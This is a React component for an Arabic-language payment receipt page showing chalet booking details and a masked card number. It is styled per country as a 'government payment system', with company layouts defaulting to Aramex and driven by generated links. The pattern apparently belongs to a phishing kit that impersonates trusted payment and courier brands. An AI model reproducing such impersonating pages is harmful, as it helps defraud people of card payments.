import { useParams } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { usePayment, useLink } from "@/hooks/useSupabase";
import { getCountryByCode } from "@/lib/countries";
import { formatCurrency } from "@/lib/countryCurrencies";
import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
import { getReceiptLayout } from "@/components/ReceiptLayouts";
import { CheckCircle2, Download, Home, Share2 } from "lucide-react";

const PaymentReceipt = () => {
  const { paymentId } = useParams();
  const { data: payment } = usePayment(paymentId);
  const { data: link } = useLink(payment?.link_id || undefined);
  
  if (!payment || !link) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <div className="animate-pulse text-xl">جاري التحميل...</div>
      </div>
    );
  }
  
  const countryData = getCountryByCode(link.country_code);
  if (!countryData) return null;
  
  const payload = link.payload;
  
  // Get government payment system
  const selectedCountry = link.payload?.selectedCountry || link.country_code || "SA";
  const govSystem = getGovernmentPaymentSystem(selectedCountry);
  
  // Get service key for company-specific layout
  const serviceKey = link.payload?.service_key || 'aramex';
  const ReceiptLayoutComponent = getReceiptLayout(serviceKey);
  
  // Format payment data
  const formattedAmount = formatCurrency(payment.amount, link.country_code);
  const formattedDate = new Date(payment.created_at).toLocaleDateString('ar-SA', {
    year: 'numeric',
    month: 'long',
    day: 'numeric',
    hour: '2-digit',
    minute: '2-digit'
  });
  
  return (
    <div 
      className="min-h-screen py-12" 
      dir="rtl"
      style={{ background: govSystem.colors.surface }}
    >
      <div className="container mx-auto px-4">
        <div className="max-w-2xl mx-auto">
          {/* Success Animation */}
          <div className="text-center mb-8">
            <div 
              className="w-24 h-24 rounded-full flex items-center justify-center mx-auto mb-4 animate-scale-in"
              style={{
                background: govSystem.gradients.primary,
                boxShadow: govSystem.shadows.lg
              }}
            >
              <CheckCircle2 className="w-12 h-12 text-white" />
            </div>
            <h1 
              className="text-4xl font-bold mb-2"
              style={{ 
                color: govSystem.colors.text,
                fontFamily: govSystem.fonts.primaryAr 
              }}
            >
              تم الدفع عبر {govSystem.nameAr} بنجاح!
            </h1>
            <p 
              className="text-lg" 
              style={{ color: govSystem.colors.textLight }}
            >
              شكراً لك، تم تأكيد حجزك
            </p>
          </div>
          
          <Card 
            className="p-8"
            style={{ 
              boxShadow: govSystem.shadows.lg,
              borderRadius: govSystem.borderRadius.lg
            }}
          >
            {/* Receipt Header */}
            <div className="text-center pb-6 border-b border-border mb-6">
              <Badge 
                className="text-sm px-4 py-2 mb-3"
                style={{
                  background: govSystem.gradients.primary,
                  color: govSystem.colors.textOnPrimary,
                  fontFamily: govSystem.fonts.primaryAr
                }}
              >
                <CheckCircle2 className="w-4 h-4 ml-2" />
                <span>مدفوع</span>
              </Badge>
              
              <p 
                className="text-sm" 
                style={{ 
                  color: govSystem.colors.textLight,
                  fontFamily: govSystem.fonts.primaryAr 
                }}
              >
                رقم الإيصال
              </p>
              <p 
                className="text-2xl font-bold"
                style={{ 
                  color: govSystem.colors.text,
                  fontFamily: govSystem.fonts.primaryAr 
                }}
              >
                GF-{payment.id.substring(0, 8).toUpperCase()}
              </p>
            </div>
            
            {/* Details */}
            <div className="space-y-4 mb-6">
              <div className="flex justify-between py-3 border-b border-border">
                <span className="text-muted-foreground">الخدمة</span>
                <span className="font-semibold">{payload.chalet_name}</span>
              </div>
              
              <div className="flex justify-between py-3 border-b border-border">
                <span className="text-muted-foreground">المدة</span>
                <span className="font-semibold">{payload.nights} ليلة</span>
              </div>
              
              <div className="flex justify-between py-3 border-b border-border">
                <span className="text-muted-foreground">عدد الضيوف</span>
                <span className="font-semibold">{payload.guest_count} ضيف</span>
              </div>
              
              <div className="flex justify-between py-3 border-b border-border">
                <span className="text-muted-foreground">طريقة الدفع</span>
                <span className="font-semibold">
                  بطاقة •••• {payment.last_four}
                </span>
              </div>
              
              <div className="flex justify-between py-3 border-b border-border">
                <span className="text-muted-foreground">التاريخ</span>
                <span className="font-semibold" dir="ltr">
                  {new Date(payment.created_at).toLocaleDateString("ar-SA")}
                </span>
              </div>
              
              <div 
                className="flex justify-between py-4 rounded-lg px-4"
                style={{
                  background: `${govSystem.colors.primary}15`,
                  borderRadius: govSystem.borderRadius.md
                }}
              >
                <span className="text-lg font-bold">المبلغ المدفوع</span>
                <span className="text-2xl font-bold text-green-500">
                  {formatCurrency(payment.amount, payment.currency || "SAR")}
                </span>
              </div>
            </div>
            
            {/* Actions */}
            <div className="flex flex-col sm:flex-row gap-3">
              <Button size="lg" className="flex-1" variant="outline">
                <Download className="w-5 h-5 ml-2" />
                <span>تحميل الإيصال</span>
              </Button>
              
              <Button size="lg" className="flex-1" variant="outline">
                <Share2 className="w-5 h-5 ml-2" />
                <span>مشاركة</span>
              </Button>
            </div>
            
            <Button
              size="lg"
              className="w-full mt-4"
              onClick={() => (window.location.href = "/")}
            >
              <Home className="w-5 h-5 ml-2" />
              <span>العودة للرئيسية</span>
            </Button>
            
            <p className="text-xs text-center text-muted-foreground mt-6">
              سيتم إرسال تفاصيل الحجز إلى بريدك الإلكتروني
            </p>
          </Card>
        </div>
      </div>
    </div>
  );
};

export default PaymentReceipt;
